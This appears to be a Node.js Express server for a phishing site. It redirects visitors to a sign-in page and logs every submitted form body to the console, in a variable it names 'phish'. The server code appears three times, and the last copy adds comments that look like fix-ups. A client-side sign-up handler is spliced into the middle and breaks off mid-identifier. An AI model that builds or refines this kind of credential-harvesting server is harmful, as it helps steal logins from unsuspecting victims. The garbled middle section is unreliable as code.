const express = require('express');
const parser = require("body-parser");
const path = require('path');
const http = require('http');
const app = express();



app.use(express.json());
app.use(parser.urlencoded({extended:true}));
app.use(express.static(path.join(__dirname,"public")));


app.get('/',(req,res)=>{
    setTimeout(()=>{
    res.redirect('/sign.html');
    },2000)

    
});
    
app.post('/hello',(req,res)=>{
    res.redirect("/av.html");
    const data = req.body;
    console.log(data);
});

app.post('/submit',(req,res)=>{
const phish = req.body;
console.log(phish);
res.end('Wait ...');
});

const server = http.createServer(app);

server.listen(92,"0.0.0.0",()=>{
    console.log('SERVER WALKING ....');
    
});






















const express = require('express');
const parser = require("body-parser");
const path = require('path');
const http = require('http');
const app = express();


function handleSignUp(event) {
    event.preventDefault(); // Prevent the default form submission

    const username = document.getconst express = require('express');
ElementById('username').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Here you can add your logic to send the data to the server
    // For demonstration, we'll just show a success message
    document.getElementById('message').innerText = 'Sign up successful!';

    // Reset the form
    document.getElementById('signupForm').reset();

    return false; // Prevent form submission
}













const express = require('express');
const parser = require("body-parser");
const path = require('path');
const http = require('http');
const app = express();

app.use(express.json());
app.use(parser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.get('/', (req, res) => {
    setTimeout(() => {
        res.redirect('/sign.html');
    }, 2000);
});

app.post('/hello', (req, res) => {
    const data = req.body;
    console.log(data);
    res.redirect("/av.html"); // Move this after logging the data
});

app.post('/submit', (req, res) => {
    const phish = req.body;
    console.log(phish);
    res.send('Wait ...'); // Use res.send instead of res.end
});

const server = http.createServer(app);

server.listen(92, "0.0.0.0", () => {
    console.log('SERVER WALKING ....');
});